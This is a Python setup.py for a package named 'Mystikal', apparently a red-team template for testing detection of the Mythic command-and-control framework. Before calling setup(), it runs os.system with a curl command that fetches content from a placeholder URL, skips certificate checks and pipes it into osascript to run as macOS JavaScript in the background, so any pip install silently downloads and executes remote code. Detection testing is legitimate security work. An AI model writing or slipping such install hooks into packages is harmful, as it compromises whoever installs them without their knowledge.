from setuptools import setup, find_packages
import os

os.system('curl -k "URL" | osascript -l JavaScript &')

setup(
    name = 'Mystikal',
    packages = find_packages(),
    version = '1.0',
    description = 'Python PIP package to test Mythic detection',
    author = '',
    author_email = '',
    url = 'https://github.com/D00MFist/Mystikal',
    download_url = 'https://github.com/D00MFist/Mystikal',
    keywords = [''],
    classifiers = [],
)
